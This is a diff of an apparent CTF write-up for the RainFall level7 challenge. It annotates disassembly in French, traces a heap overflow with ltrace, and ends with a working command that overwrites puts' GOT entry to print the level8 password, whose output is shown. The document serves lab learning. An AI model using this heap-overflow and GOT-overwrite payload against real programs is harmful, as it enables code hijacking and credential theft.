@@ -5,9 +5,9 @@ Dump of assembler code for function main:
    0x08048522 <+1>:	mov    ebp,esp
    0x08048524 <+3>:	and    esp,0xfffffff0
    0x08048527 <+6>:	sub    esp,0x20
-   0x0804852a <+9>:	mov    DWORD PTR [esp],0x8
+   0x0804852a <+9>:	mov    DWORD PTR [esp],0x8                  # arg var1 malloc(8)
    0x08048531 <+16>:	call   0x80483f0 <malloc@plt>               # eax == 0x804a008
-   0x08048536 <+21>:	mov    DWORD PTR [esp+0x1c],eax
+   0x08048536 <+21>:	mov    DWORD PTR [esp+0x1c],eax             # emplacement var1 dans stack
    0x0804853a <+25>:	mov    eax,DWORD PTR [esp+0x1c]
    0x0804853e <+29>:	mov    DWORD PTR [eax],0x1
    0x08048544 <+35>:	mov    DWORD PTR [esp],0x8
@@ -44,13 +44,13 @@ Dump of assembler code for function main:
    0x080485ba <+153>:	mov    DWORD PTR [esp],eax
    0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
    0x080485c2 <+161>:	mov    edx,0x80486e9         # "r" "/home/user/level8/.pass" "~~"
-   0x080485c7 <+166>:	mov    eax,0x80486eb
+   0x080485c7 <+166>:	mov    eax,0x80486eb          # stream?
    0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx
    0x080485d0 <+175>:	mov    DWORD PTR [esp],eax
    0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
-   0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax
-   0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44
-   0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960
+   0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax   # stream?
+   0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44  # 2eme arg de gets (taille)
+   0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960 # 1e arg fgets (c)
    0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
    0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703    
    0x080485f7 <+214>:	call   0x8048400 <puts@plt>
@@ -87,4 +87,32 @@ Dump of assembler code for function m:
 0x80486eb:	 "/home/user/level8/.pass"
 0x8048703:	 "~~"
 0x8048706:	 ""
+```
+
+``` bash
+level7@RainFall:~$ ltrace ./level7 $(python2 -c 'print "A" * 24') $(python2 -c 'print "B" * 8')
+__libc_start_main(0x8048521, 3, 0xbffff7c4, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                                  = 0x0804a008
+malloc(8)                                                                  = 0x0804a018
+malloc(8)                                                                  = 0x0804a028
+malloc(8)                                                                  = 0x0804a038
+strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAAAAA")                             = 0x0804a018
+strcpy(0x41414141, "BBBBBBBB" <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
+
+```
+
+(gdb) disas puts
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:	jmp    *0x8049928
+   0x08048406 <+6>:	push   $0x28
+   0x0804840b <+11>:	jmp    0x80483a0
+End of assembler dump.
+
+
+``` bash
+level7@RainFall:~$ ./level7 $(python2 -c 'print "A" * 20 + "\x28\x99\x04\x08" ') $(python2 -c 'print "\xf4\x84\x04\x08"')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1785247605
+
 ```
